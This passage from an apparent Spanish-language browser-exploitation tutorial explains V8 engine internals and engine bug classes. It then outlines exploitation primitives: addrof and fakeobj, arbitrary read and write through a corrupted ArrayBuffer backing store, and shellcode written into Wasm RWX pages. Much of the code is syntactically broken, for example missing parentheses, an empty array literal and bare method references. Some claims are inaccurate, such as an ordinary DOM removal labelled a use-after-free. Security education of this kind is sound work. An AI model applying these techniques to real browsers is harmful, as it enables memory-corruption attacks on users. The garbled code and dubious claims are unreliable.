- r2 → [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) local `c`

#### 3.2.4. Feedback Vector

El feedback vector (o vector de retroalimentación) es una estructura de datos que almacena información sobre cómo se comportó el código durante la ejecución:

```javascript
function add(a, b) { return a + b; }
add(1, 2); // Feedback: "a es SMI (entero pequeño), b es SMI"
add(1, 2); // Feedback confirmado
add(1.5, 2.3); // Feedback: "a es Number, b es Number"
add("a", "b"); // Feedback: "a es String, b es String"
```

V8 puede analizar este feedback para optimizar el código en TurboFan.

### 3.3. TurboFan — Compilador JIT Optimizador

TurboFan es el compilador JIT (Just-In-Time) optimizador de V8. Cuando una función se ejecuta muchas veces (hot function), V8 envía la función a TurboFan para generar código máquina optimizado.

#### 3.3.1. Sea of Nodes IR

TurboFan usa un IR (Intermediate Representation) llamado "Sea of Nodes". Es un grafo de nodos donde:

- **Nodos:** Representan operaciones (Add, LoadField, StoreField, CheckHeapObject, etc.)
- **Edges:** Representan el flujo de datos (data flow) y el flujo de control (control flow)
- **Fases:** El grafo se transforma a través de múltiples fases hasta generar código máquina.

Ejemplo conceptual del grafo para `let c = a + b`:
```
Control → Start ↓
JSAdd (a, b) → CheckSmi(a) → CheckSmi(b) ↓
Return (c)
```

#### 3.3.2. Fases de Compilación

TurboFan tiene estas fases principales:

1. **BytecodeGraphBuilder:** Construye el grafo inicial desde bytecode.
2. **Typer:** Asigna tipos a cada nodo basado en feedback.
3. **LoadElimination:** Elimina cargas redundantes.
4. **Inlining:** Expande funciones inline.
5. **EscapeAnalysis:** Analiza qué objetos no escapan.
6. **SimplifiedLowering:** Baja operaciones simplificadas.
7. **EffectControlLinearizer:** Linealiza efectos.
8. **RegisterAllocation:** Asigna registros físicos.
9. **CodeGeneration:** Genera código máquina.

#### 3.3.3. Especulación y Deoptimización

TurboFan hace suposiciones especulativas basadas en el feedback:

```javascript
// Supone que 'obj' siempre tiene la misma forma (hidden class)
function getX(obj) { return obj.x;
}
// TurboFan especula: obj tiene Map M1
// Si en ejecución obj tiene Map M2 → DEOPT
```

**Deoptimización:** Cuando una suposición es incorrecta:
1. V8 guarda un "punto de guardia" (guard) antes del código optimizado.
2. Si el guard falla, se salta al intérprete (código no optimizado).
3. Esto permite que el código optimizado sea agresivo sin sacrificar corrección.

#### 3.3.4. Typer y Range Analysis

El Typer asigna tipos a los nodos del grafo usando información de feedback:

```javascript
function foo(i) { return arr[i];  // Typer: i es un entero en rango [0, arr.length)
}
```

Si i siempre está en rango, TurboFan puede **ELIMINAR EL BOUNDS CHECK**:

```javascript
// Sin eliminación de bounds check:
if (i < arr.length) return arr[i]; else throw RangeError;

// Con eliminación de bounds check:
return arr[i];  // Directo, sin chequeo
```

Si el Typer se equivoca (por ejemplo, si el feedback muestra i entre [0, 100] pero en realidad puede ser 200), tenemos un **OOB Access**.

#### 3.3.5. Simplified Lowering

Simplified Lowering es una fase crítica de TurboFan que "baja" (lower) representaciones simplificadas a representaciones concretas.

Es aquí donde ocurrieron bugs famosos ([cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2020-16040, [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2021-21224) cuando Simplified Lowering aplicaba transformaciones incorrectas a tipos.

#### 3.3.6. Escape Analysis

Escape Analysis determina si un objeto "escapa" (es decir, si alguna referencia al objeto sobrevive fuera del ámbito de la función).

Si un objeto no escapa, TurboFan puede:
- Almacenar sus propiedades en registros (stack allocation).
- No crear el objeto en absoluto (scalar replacement).

```javascript
function foo { let obj = { x: 1, y: 2 }; return obj.x + obj.y;  // obj no escapa
}
// TurboFan convierte esto a:
// let obj_x = 1; let obj_y = 2;
// return obj_x + obj_y;
```

Bugs en Escape Analysis pueden llevar a type confusion si la asignación no se hace correctamente.

### 3.4. Sparkplug — Compilador JIT No-Optimizador

Sparkplug es un compilador introducido en V8 9.5+ que convierte directamente bytecode a código máquina sin optimizaciones pesadas.

#### 3.4.1. Rol de Sparkplug

Sparkplug llena el vacío entre Ignition (lento pero rápido de compilar) y TurboFan (rápido pero lento de compilar):
- **Compilación:** Extremadamente rápida (no tiene fases complejas).
- **Código generado:** Significativamente más rápido que el intérprete (2-3x).
- **Uso:** Para funciones que son "tibias" (warm), no lo suficientemente calientes para TurboFan pero que merecen algo mejor que intérprete.

#### 3.4.2. Diferencias con TurboFan

| Aspecto | Sparkplug | TurboFan |
|---------|-----------|----------|
| Tiempo de compilación | ~100μs | ~1-100ms |
| Optimizaciones | Ninguna | Múltiples |
| Código generado | Direct mapping | Muy optimizado |
| Speculación | No | Sí |
| Deopt | No | Sí |

### 3.5. Maglev — Compilador JIT Mid-Tier

Maglev es el compilador mid-tier más nuevo de V8, entre Sparkplug y TurboFan.

#### 3.5.1. Cuándo se Activa

Maglev se activa cuando Sparkplug no es suficiente pero TurboFan es demasiado costoso. Ofrece optimizaciones parciales como:
- Small function inlining
- Type feedback optimization sin especulación
- Mejor register allocation que Sparkplug

#### 3.5.2. Optimizaciones Parciales

Maglev puede hacer:
- **Eliminación de checks redundantes:** Si una función siempre recibe Smis, elimina chequeos de tipo.
- **Caching de propiedades:** Similar a IC pero a nivel de código generado.
- **Loop invariant code motion:** Mueve código invariante fuera de loops.

### 3.6. Garbage Collection en V8

El GC (Garbage Collector) de V8 se llama Orinoco. Es un GC generacional, concurrente y paralelo.

#### 3.6.1. Generational GC

V8 divide los objetos en generaciones:
- **Young Generation:** Objetos nuevos (asignados recientemente).
- **Old Generation:** Objetos que sobreviven múltiples GC.

La hipótesis generacional: la mayoría de objetos mueren jóvenes (escritos, usados, y nunca más referenciados).

#### 3.6.2. Young Generation (Semi-Space, From/To)

La Young Generation tiene dos semispacios: **From-space** y **To-space**.

1. Se asigna en From-space.
2. Cuando From-space se llena, se hace un **Scavenge** (GC menor).
3. Objetos vivos se copian a To-space.
4. Se intercambian From/To.

```javascript
let a = { x: 1 };  // Asignado en Young
let b = { x: 2 };  // Asignado en Young
// [Scavenge GC]
// Si 'a' está vivo (referenciado), se copia a To-space
// Si 'b' es basura, se descarta
```

#### 3.6.3. Old Generation (Mark-Sweep, Mark-Compact)

Objetos que sobreviven varios Scavenges son promovidos a Old Generation.

**Mark-Sweep:**
1. **Mark:** Recorrer el grafo de objetos vivos desde las raíces (roots).
2. **Sweep:** Barrer la memoria, liberar objetos no marcados.

**Mark-Compact:**
1. Marcar (como Mark-Sweep).
2. Compactar: Desplazar objetos vivos para eliminar fragmentación.

#### 3.6.4. Incremental Marking

Para evitar pausas largas, V8 puede hacer el marcado incrementalmente:
1. El GC comienza a marcar.
2. La ejecución de JS se intercala con pequeños pasos de marcado.
3. Cuando termina de marcar, se hace un Sweep/Compact rápido.

#### 3.6.5. Concurrent y Parallel GC

- **Concurrent:** El GC corre en un thread separado mientras JS se ejecuta. Usa barreras de memoria (write barriers) para mantener consistencia.
- **Parallel:** Varios threads GC trabajan juntos en la misma tarea (ej: marcar en paralelo).

#### 3.6.6. Memory Pools y Object Allocation

V8 mantiene pools de memoria:
- **New Space:** ~8 MB (joven)
- **Old Space:** Variable
- **Code Space:** Para código JITeado
- **Map Space:** Para Maps (hidden classes)
- **Large Object Space:** Para objetos > 256 KB

La asignación es rápida (bump pointer allocation) en New Space.

#### 3.6.7. Weak References y FinalizationRegistry

V8 soporta referencias débiles vía:
- `WeakMap` / `Weakset`: Claves débiles (no impiden GC).
- `FinalizationRegistry`: Callback cuando un objeto es recolectado.

```javascript
const registry = new FinalizationRegistry(heldValue) => { console.log(`Objeto ${heldValue} fue GCeado`);
});

let obj = {};
registry.register(obj, "miObjeto");
obj = null;  // Cuando el GC corra, puede recolectar obj
```

### 3.7. Representación de Objetos en Memoria

#### 3.7.1. HeapObject y Tagged Pointers

Un `HeapObject` en V8 es cualquier objeto asignado en el heap. Los punteros a objetos se llaman **tagged pointers**:

- El bit menos significativo (LSB) indica el tipo: - 0 → HeapObject pointer - 1 → Smi (Small Integer, entero pequeño)

```cpp
// Representación de un Smi: valor << 32 | 1 (en x64)
// Representación de un HeapObject: dirección del objeto (alineada, LSB = 0)
```

#### 3.7.2. Map (Hidden Class / Meta-Objeto)

Cada objeto en V8 tiene un **Map** (también llamado hidden class o shape). El Map describe la estructura del objeto:

```javascript
let obj1 = { x: 1, y: 2 };
let obj2 = { x: 3, y: 4 };  // Mismo Map que obj1

let obj3 = { x: 5, z: 6 };  // Diferente Map (shape diferente)
```

**Campos del Map:**
- **Instance Descriptors:** Descripción de las propiedades (nombre y offset).
- **Prototype:** Prototipo del objeto.
- **ElementsKind:** Tipo de elementos (si es array).
- **Instance Type:** Tipo de objeto (JSObject, JSArray, JSFunction, etc.)
- **Bit Field 1,2,3:** Flags varios.

#### 3.7.3. Structure del Map

El Map contiene:
- **PropertyDescriptors:** Array de descriptores (nombre, offset en in-object properties).
- **NumberOfOwnDescriptors:** Cuántas propiedades tiene el objeto.
- **IsExtensible:** Si se pueden agregar propiedades.
- **ConstructionCounter:** Contador de transiciones.

Formato en memoria (~32 bytes):
```
Offset  Campo
0 map_ptr (puntero al Map del Map)
8 instance_descriptors
16 prototype
24 instance_type | bit_fields
..
```

#### 3.7.4. In-object Properties

Las propiedades almacenadas directamente en el objeto (sin backing store) son **in-object properties**. Su número está limitado (generalmente 4-8, depende del modo de V8).

#### 3.7.5. Properties y Elements Backing Stores

Si un objeto tiene más propiedades de las que caben in-object, se usa un **properties backing store** (FixedArray):

```javascript
let obj = {};
obj.a = 1;
obj.b = 2;
obj.c = 3;
// Para muchas propiedades, se crea un FixedArray de respaldo
```

Los **elements** son propiedades indexadas numéricamente (arrays). El **ElementsKind** describe cómo se almacenan:
- `PACKED_SMI`: Solo enteros pequeños, sin huecos.
- `PACKED_DOUBLE`: Solo doubles, sin huecos.
- `PACKED_ELEMENTS`: Objetos, sin huecos.
- `HOLEY_SMI`: Smis con huecos (agujeros).
- `HOLEY_DOUBLE`: Doubles con huecos.
- `HOLEY_ELEMENTS`: Objetos con huecos.

```javascript
let arr = [1, 2, 3]; // PACKED_SMI
arr.push(1.5); // PACKED_DOUBLE
arr.push({}); // PACKED_ELEMENTS
arr[10] = 42; // HOLEY_ELEMENTS (hay agujero)
```

#### 3.7.6. Fast vs Dictionary Properties

**Fast properties:** (modo array) Las propiedades se almacenan en un array indexado. Acceso O(1).

**Dictionary properties:** (modo [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario)) Cuando el objeto tiene muchas propiedades o se agregan/eliminan muchas propiedades dinámicamente, V8 cambia a mode [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario) (NameDictionary). Acceso O(log n).

```javascript
let obj = {};
obj.a = 1; // Fast (in-object)
obj.b = 2; // Fast
// .. muchas propiedades agregadas
obj.z = 99; // Dictionary mode
```

### 3.8. Inline Cache (IC)

#### 3.8.1. IC Slots en Feedback Vector

El feedback vector contiene **IC slots** que cachean información sobre operaciones:

```javascript
function getX(obj) { return obj.x;  // LoadProperty IC
}
```

El IC slot para `obj.x` registra qué Maps ha visto:
1. Primera llamada: `obj` tiene Map M1 → Cachea M1 + offset de x.
2. Segunda llamada: mismo Map M1 → IC hit (rápido).
3. Llamada con Map M2 → IC miss → Megamorphic.

#### 3.8.2. Megamorphic vs Monomorphic

- **Monomorphic:** 1 Map visto → IC más rápido.
- **Polymorphic:** 2-4 Maps vistos → IC algo más lento.
- **Megamorphic:** >4 Maps vistos → IC lento ([hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) lookup).

#### 3.8.3. IC Caching de Propiedades

El IC no solo cachea Maps, sino también:
- **Load IC:** offset de la propiedad
- **Store IC:** offset + tipo
- **Call IC:** función destino

### 3.9. Arrays y ArrayBuffers

#### 3.9.1. Contextura de un Array (JSArray)

Un JSArray en memoria:
```
JSArray: map: Map(JSArray) properties: .. elements: FixedArray (o EmptyFixedArray) length: Smi (o Number)
```

#### 3.9.2. ElementsKind

Ver sección 3.7.5. La transición de ElementsKind es monotónica:
```
PACKED_SMI → PACKED_DOUBLE → PACKED_ELEMENTS ↓ ↓ ↓
HOLEY_SMI → HOLEY_DOUBLE → HOLEY_ELEMENTS
```

No se puede volver atrás (ej: PACKED_DOUBLE no puede volver a PACKED_SMI).

#### 3.9.3. ArrayBuffer Backing Store

Un ArrayBuffer tiene un **backing store** que es un bloque de memoria fuera del heap de V8 (allocation en memoria del sistema):

```javascript
let buf = new ArrayBuffer(0x1000);
// El backing store es un bloque de 4096 bytes en memoria del sistema
// JSArrayBuffer contiene:
// - backing_store: void* (puntero a la memoria)
// - byte_length: size_t
// - ExternalPointer (en versiones con V8 Sandbox)
```

El backing store NO está en el heap de V8. Está en memoria del sistema, accesible vía TypedArrays y DataViews.

#### 3.9.4. Typed Arrays y DataViews

Los TypedArrays (Uint8Array, Uint32Array, Float64Array, etc.) son vistas sobre el ArrayBuffer:

```javascript
let buf = new ArrayBuffer(16);
let view = new Uint32Array(buf);  // 4 enteros uint32
view[0] = 0x41414141; // Escribe al backing store
```

Internamente:
- **JSTypedArray:** Contiene referencia al ArrayBuffer + offset + length.
- **DataView:** Vista similar pero sin type restrictions fuertes.

### 3.10. Wasm (WebAssembly) en V8

#### 3.10.1. Liftoff (Compilador Rápido)

Liftoff es el compilador base de WebAssembly en V8. Compila cada instrucción Wasm individualmente a código máquina sin optimizaciones entre instrucciones. Es rápido para compilar pero el código generado no es óptimo.

#### 3.10.2. TurboFan Wasm

Para funciones Wasm muy ejecutadas, TurboFan puede recompilarlas con optimizaciones, similar a lo que hace con JS.

#### 3.10.3. Memoria Lineal de Wasm

WebAssembly tiene un espacio de memoria lineal (un ArrayBuffer gigante). El módulo Wasm puede leer/escribir en esta memoria con instrucciones como `i32.load` / `i32.store`.

Antes de V8 Sandbox, este buffer se mapeaba en la memoria del [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) del renderer, dando acceso a todo el espacio de direcciones.

#### 3.10.4. RWX Pages (W^X)

Históricamente, V8 asignaba páginas de memoria **RWX** (Read-Write-Execute) para código Wasm compilado. Esto permitía escribir código JITeado y ejecutarlo.

Con W^X (a partir de Chrome 80+):
- Las páginas JIT son **RW** o **RX**, nunca ambas al mismo tiempo.
- Se necesita un "flip" de [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) entre escritura y ejecución.
- Esto hace más difícil inyectar shellcode vía Wasm.

---

## 4. vulnerabilidadces Clásicas en el Motor JS

### 4.1. Type Confusion

Type confusion ocurre cuando el motor JS trata un objeto como si fuera de un tipo diferente al que realmente es.

#### 4.1.1. Mecanismo de Type Confusion

```
V8 piensa: obj es un JSArray  →  acceso a obj.elements (FixedArray)
Realidad: obj es un JSObject  →  acceso a obj.properties
```

Esto permite leer/escribir en campos que [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) no espera, potencialmente corrompiendo la memoria.

#### 4.1.2. Casos Famosos

- **[cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2020-6418:** Type confusion en TurboFan en la función `SimplifyStringToLower`. Simplificación incorrecta de string length.
- **CVE-2021-21225:** Type confusion en `Array.prototype.concat`.

#### 4.1.3. Explotación de Type Confusion

```
1. Encontrar bug de type confusion en TurboFan
2. Confundir un objeto A como tipo B
3. Leer/Escribir offsets que no corresponden al tipo real
4. Construir primitivas (addrof/fakeobj)
```

### 4.2. [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) Compiler Bugs

#### 4.2.1. Eliminación Incorrecta de Bounds Checking

TurboFan elimina bounds checks (chequeos de límites) cuando cree que los índices están dentro del rango. Si el análisis de rango está mal:

```javascript
function foo(i) { return arr[i];  // Sin bounds check si Typer dice i en rango
}
// Si i no está en rango → OOB access a memoria más allá del array
```

#### 4.2.2. Speculative Optimization Bugs

TurboFan hace optimizaciones especulativas. Si la especulación es incorrecta:

```javascript
// Supone: obj siempre tiene Map M
function bar(obj) { return obj.x + 1;
}
// Si obj puede tener otro Map.. confusión
```

#### 4.2.3. Range Analysis Incorrecta

El analysis de rango (range analysis) determina el intervalo posible de una [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables). Si es incorrecto:

```javascript
function baz(n) { // Typer dice n está en [0, 10] por feedback let i = Math.min(n, 10); let j = i * 4;  // Typer: j en [0, 40] // arr tiene 16 bytes (4 elementos x 4 bytes) return arr[j];  // Sin bounds check: arr index por j! // j > 16 → OOB
}
```

#### 4.2.4. Dead Code Elimination Agresiva

Eliminar código considerado "muerto" (que no tiene efecto visible). Si es código de seguridad:

```javascript
function vuln(obj) { let typeCheck = CheckType(obj, EXPECTED_TYPE);  // Eliminado si compile cree que no es necesario return obj.mutate;  // Sin type check → type confusion
}
```

#### 4.2.5. Escape Analysis Defectuoso

Escape analysis cree que un objeto no escapa, y lo asigna en el stack o hace scalar replacement. Si el análisis está mal:

```javascript
function badEscape { let obj = { x: 1 }; obj.__proto__ = someGlobalObject;  // ¡obj escapa (via __proto__)! // Escape analysis: obj no escapa (mal) return obj.x;  // Cree que obj está en stack → confusión
}
```

### 4.3. OOB (Out-of-Bounds) Access

#### 4.3.1. OOB en Arrays

```javascript
let arr = [1, 2, 3];
// Si hay un bug que permite leer arr[5] → OOB
```

Acceder a índices fuera del array permite leer/escribir en el heap de V8 (en objetos adyacentes).

#### 4.3.2. OOB en TypedArrays

TypedArrays tienen bounds checking. Si se elimina:

```javascript
let buf = new ArrayBuffer(16);
let view = new Uint32Array(buf);
// Sin bounds check: view[100] escribe en memoria arbitraria
// view[100] → 100 * 4 = 400 bytes desde el backing store
```

#### 4.3.3. OOB en ArrayBuffers

Similar a TypedArrays. Corrupción del campo `byte_length`:

```javascript
let buf = new ArrayBuffer(16);
// Si corrompemos buf.byte_length = 0xFFFFFFFF
// Podemos acceder a toda la memoria del proceso vía DataView
```

### 4.4. Use-After-Free (UAF)

UAF ocurre cuando se accede a un objeto después de que ha sido liberado por el GC o explícitamente.

#### 4.4.1. UAF en Elementos DOM

```javascript
let elem = document.getElementById("foo");
elem.remove;  // El elemento se libera de la memoria
console.log(elem.textContent);  // UAF: elem es dangling pointer
```

Esto pasa cuando JS mantiene una referencia a un objeto DOM que el engine de C++ ya liberó.

#### 4.4.2. UAF en Objetos JS

```javascript
let arr = ;  // Array en el heap
// Si de alguna forma el GC recolecta arr pero arr sigue siendo accesible via una referencia falsa
```

#### 4.4.3. Race Conditions con GC

```javascript
// Escenario: GC concurrente
let obj = { x: 1 };
// Mientras el GC procesa, un thread concurrente decide que obj vivo
// Si la barrera de escritura no se actualiza → UAF
```

### 4.5. Integer Overflow/Underflow

```javascript
let big = 0xFFFFFFFFF;
let small = big + 1;  // Overflow si se trata como entero de 32 bits
```

Si TurboFan maneja mal enteros grandes, puede llevar a:
- Cálculo incorrecto de tamaño de buffer (heap [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow))
- Cálculo incorrecto de índice (OOB)

---

## 5. Primitivas de Explotación

### 5.1. addrof — Address Of Object

addrof (address of) es la primitiva que nos da la dirección de memoria de un objeto en el heap de [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8).

#### 5.1.1. Teoría de funcioniones)amiento

La idea es engañar a V8 para que nos dé la dirección de un objeto como un número.

```javascript
// addrof(obj) → dirección de obj en el heap
```

Estrategias clásicas:
1. Usar type confusion para que el [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) trate un objeto como un número.
2. Usar OOB para leer el pointer de un objeto dentro de otro objeto.
3. Usar una corrupción en el Map para que la propiedad devuelva la dirección.

#### 5.1.2. Implementación Paso a Paso

**Técnica clásica con type confusion y array:**

```javascript
// Paso 1: Obtener un OOB read
let oob_arr = [1.1, 1.2, 1.3, 1.4];
// Después de explotar un bug de OOB:
// oob_arr puede leer más allá de su length

// Paso 2: Colocar un objeto al lado en el heap
let target_obj = {};
// En V8, arrays y objetos se asignan en el mismo heap
// Con OOB desde oob_arr, podemos leer la memoria cercana

// Paso 3: Interpretar los bits como float64, luego convertirlos
function ftoi(f) { // Float64 → BigInt (bytes raw) let buf = new ArrayBuffer(8); let f64 = new Float64Array(buf); let u64 = new BigUint64Array(buf); f64[0] = f; return u64[0];
}
```

**addrof usando OOB:**

```javascript
// Asumimos que tenemos oob_arr con capacidad OOB
// Colocamos target_obj justo después en el heap
let obj_idx = oob_arr.length;  // Primer elemento OOB

// Cuando el array termina, los siguientes 8 bytes pueden ser
// un puntero a target_obj
let addr = ftoi(oob_arr[obj_idx]);
// addr es la dirección del objeto en el heap
// Ajustar por tagged pointer (bit bajo = 0)
addr = addr & ~BigInt(1);
```

#### 5.1.3. Técnicas: Map Confusion, Array.length Confusion

**Map Confusion:** Confundir el Map de un objeto para que un campo que debería ser un objeto sea leído como número (Smi/float).

**Array.length Confusion:**
```javascript
// Confundir arr.length con otro campo
// arr.length normalmente es un Smi (entero pequeño)
// Si podemos corromperlo.. OOB!
```

### 5.2. fakeobj — Fake Object

fakeobj convierte una dirección de memoria en un objeto fake (un objeto que controlamos).

#### 5.2.1. Cómo Crear Objetos Falsos

```javascript
// fakeobj(addr) → objeto en addr (que nosotros controlamos)
```

Básicamente:
1. Escribimos un valor de 8 bytes en memoria que parece un Map + propiedades.
2. Engañamos a V8 para que trate esa dirección como un HeapObject.
3. Ahora podemos leer/escribir propiedades "falsas".

#### 5.2.2. Especificación de Map Falso

Para que un objeto falso funcione, necesitamos un Map válido:

```javascript
// Layout de un Map falso:
// Offset 0: map_of_map (puntero a Map del Map)
// Offset 8: instance_descriptors
// Offset 16: prototype
// Offset 24: instance_type | bit_fields (tipo JSObject)

// Necesitamos un Map real existente:
let real_obj = {};
let map_addr = addrof(map_of(real_obj);

// O usar un Map de array:
let arr = [1.1, 2.2];
let arr_map_addr = addrof(map_of(arr);
```

#### 5.2.3. Construcción de un fakeobj Confiable

```javascript
// 1. Creamos un buffer con datos que parecen un objeto
let container = [1.1, 2.2, 3.3, 4.4];
let container_addr = addrof(container);
let elements_addr = ..  // dirección del FixedArray de container

// 2. Escribimos en los elementos el contenido de un objeto falso
// Los elementos de container son float64, podemos escribir lo que queramos
container[0] = new Float64FromBits(map_addr);  // map_ptr
container[1] = new Float64FromBits(prototype_addr);  // prototype
container[2] = new Float64FromBits(0);  // properties: empty
container[3] = new Float64FromBits(0);  // elements: empty

// 3. Creamos el fakeobj apuntando a elements_addr
let fake = fakeobj(elements_addr);
// Ahora fake es un objeto cuyo contenido controlamos

// 4. Podemos modificar el Map de fake para cambiar su tipo:
// Por ejemplo, hacer que parezca un ArrayBuffer
// y modificar su backing_store pointer
```

### 5.3. Arbitrary Read

Una vez que tenemos addrof y fakeobj, podemos leer memoria arbitraria.

#### 5.3.1. Lectura con ArrayBuffer Corrompido

```javascript
// 1. Crear un ArrayBuffer
let ab = new ArrayBuffer(0x100);

// 2. Hacer un fakeobj que sea una copia de ab
let ab_addr = addrof(ab);
let fake_ab = fakeobj(ab_addr);

// 3. Modificar el backing_store de fake_ab a la dirección objetivo
fake_ab.backing_store = target_ptr;

// 4. Crear un DataView sobre el ab "original"
let dv = new DataView(ab);

// 5. Leer desde la dirección objetivo
let value = dv.getUint32(0, true);  // Little-endian
let value64 = dv.getBigUint64(0, true);
```

#### 5.3.2. Lectura vía TypedArray Modificado

```javascript
// 1. Obtener el offset del backing_pointer en un TypedArray
// Esto varía según la versión de V8

// 2. Escribir la dirección objetivo como backing_store
typed_arr.backing_store = target_addr;

// 3. Leer desde el TypedArray
let val = typed_arr[0];
```

#### 5.3.3. Lectura con Objetos JS Falsos

```javascript
// 1. Crear un fakeobj cuyo Map es el de un objeto con propiedades
// 2. Leer propiedades que en realidad apuntan a direcciones arbitrarias
```

### 5.4. Arbitrary Write

#### 5.4.1. Escritura vía Corrupción de ArrayBuffer

Similar a lectura pero escribiendo:

```javascript
// 1. Modificar backing_store a target_ptr
// 2. Usar DataView.setUint32/64 para escribir
dv.setUint32(0, value, true);
```

#### 5.4.2. Escritura vía Corrupción de Propiedades

Usando fakeobj:
```javascript
// fake_obj está en addr X
// Escribimos en fake_obj.property, que escribe en X + offset
fake_obj.my_prop = 0x41414141;
// Esto escribe donde le digamos, si controlamos el Map
```

#### 5.4.3. DataView con Backing Store Manipulado

```javascript
// La técnica más común para arbitrary write
// 1. Crear ArrayBuffer
// 2. Hacer fake copy
// 3. Cambiar backing_store a target
// 4. Escribir con DataView
```

### 5.5. Code Execution (Wasm RWX)

#### 5.5.1. Wasm RWX Pages en Versiones Antiguas

Antes de W^X, V8 mapeaba páginas RWX para código jiteado de Wasm:

```javascript
// Crear módulo Wasm
let wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, ..]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);

// La función Wasm tiene código ejecutable en páginas RWX
let wasmFunc = wasmInstance.exports.main;
```

La dirección de la función Wasm se podía obtener y luego se podía escribir shellcode en esa página.

#### 5.5.2. Shellcode Injection en Wasm

```javascript
// 1. Obtener addr de la función Wasm
let wasmFuncAddr = getWasmFuncAddr(wasmFunc);

// 2. Escribir shellcode en la página RWX
for (let i = 0; i < shellcode.length; i += 8) { write64(wasmFuncAddr + i, shellcode[i]);
}

// 3. Llamar a wasmFunc → ejecuta shellcode
wasmFunc;
```

#### 5.5.3. [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) Spray (Histórico)

JIT Spray era una técnica donde se generaban valores numéricos que, al ser JITeados, producían código máquina ejecutable:

```javascript
// En versiones muy antiguas de V8 (~2012):
let a = 0xCCCCCCCC;
let b = 0x41414141;
// El JIT convertía estos números a código máquina
// que era ejecutable en el heap JIT..
```

W^X y mitigaciones posteriores eliminaron esta técnica.

### 5.6. Arbitrary R/W Consolidado

#### 5.6.1. Construcción de un Primitive [set](../raw/ph1sh1ng.md#social-engineering-toolkit) Completo

```javascript
// Sistema completo de primitivas:
const PRIMITIVES = { addrof(obj) { // Devuelve BigInt con la dirección }, fakeobj(addr) { // Devuelve objeto en addr }, read64(addr) { // Lee 8 bytes en addr }, write64(addr, value) { // Escribe 8 bytes value en addr }, write32(addr, value) { // Escribe 4 bytes }, read8(addr) { // Lee 1 byte },
};
```

#### 5.6.2. Lectura/Escritura de Memoria Arbitraria

Con estas primitivas podemos:
- Leer memoria del [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) (incluyendo stacks, código, etc.)
- Escribir en regiones de datos
- Modificar estructuras del SO
- Escribir shellcode en Wasm RWX

---

## 6. DOM Related exploitation

### 6.1. Modelo del DOM en Chromium

#### 6.1.1. Representación Interna

El DOM se implementa en C++ (Blink engine). Los objetos C++ tienen wrappers JS (objetos [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) que referencian al objeto C++):

```
JS Object (Wrapper)  →  C++ Node/Element  →  Render tree ↑ ↑ Referencia V8 Referencia Blink
```

#### 6.1.2. Wrapper Objetos JS ↔ C++

Cuando JS accede a `document.getElementById("foo")`:
1. Blink encuentra el C++ Node.
2. Blink obtiene o crea el V8 wrapper asociado.
3. Devuelve el V8 wrapper al script.

Cada wrapper tiene un **internal field** que apunta al objeto C++.

#### 6.1.3. Referencias desde JS a Objetos C++

```cpp
// En C++:
class Node : public ScriptWrappable { // .. // Si JS tiene una referencia a este Node, // el GC de V8 lo sabe y no lo recolecta
};
```

Si el objeto C++ se destruye pero JS aún tiene una referencia al wrapper.. **UAF**.

### 6.2. Use-After-Free en el DOM

#### 6.2.1. Ciclo de Vida de Nodos

```cpp
// 1. Creación: parent->appendChild(child);
// → child se crea en C++ y se asigna wrapper V8
// 2. Referencia: JS guarda una referencia al child
// 3. Eliminación: parent->removeChild(child);
// → child se elimina de C++, pero.. ¿qué pasa con el wrapper?
```

Si el wrapper V8 no se notifica de la eliminación, seguirá apuntando a memoria liberada.

#### 6.2.2. Eliminación de Nodos y Referencias Colgantes

```javascript
let div = document.createElement("div");
div.innerHTML = '<span id="x">text</span>';
let span = document.getElementById("x");

// Mantenemos una referencia JS a span
// Ahora el span se elimina:
div.innerHTML = '';  // span se elimina de C++

// BUT: span en JS sigue siendo un wrapper que apunta a memoria liberada
console.log(span.textContent);  // UAF!
```

#### 6.2.3. Event Listeners y UAF

```javascript
let elem = document.getElementById("target");
elem.addEventListener("click", function handler { // En medio del handler, se elimina el elemento elem.remove;  // UAF: el handler se ejecuta sobre objeto desasignado console.log("Clicked");
});
```

#### 6.2.4. Ejemplos: [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2019-13720, [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2020-6383

**CVE-2019-13720 (UAF en AudioContext):**
- Al cerrar un AudioContext mientras hay operaciones pendientes.
- Race entre el destructor de C++ y el wrapper V8.
- UAF → arbitrary R/W → sandbox escape.

**CVE-2020-6383 (UAF en Web Worker):**
- Race entre terminar un worker y acceder a sus estructuras desde el main thread.

### 6.3. Mutation Observers

#### 6.3.1. Cómo funcionan

```javascript
let observer = new MutationObserver(mutations) => { // Callback cuando el DOM cambia // Las mutaciones se procesan microtask
});

observer.observe(targetNode, { attributes: true, childList: true, subtree: true
});
```

#### 6.3.2. Race Conditions con MutationObserver

```javascript
let observer = new MutationObserver( => { // Esto se ejecuta como microtask // Durante la mutación, las estructuras DOM pueden estar en estado inconsistente
});

// Trigger mutación que pone el DOM en estado inconsistente
// → El Observer se ejecuta en medio → double free
```

#### 6.3.3. Triggering UAF via Mutations

```javascript
let target = document.getElementById("target");
let observer = new MutationObserver( => { // En medio del callback, otro elemento se está eliminando let removed = document.getElementById("beingRemoved"); removed.textContent = "UAF!";  // UAF!
});
observer.observe(target, { attributes: true });

target.setAttribute("data-x", "trigger");  // Dispara observer
```

### 6.4. Event Handler Exploitation

#### 6.4.1. Event Loop y Handlers

El event loop de JS:
```
1. Ejecutar script
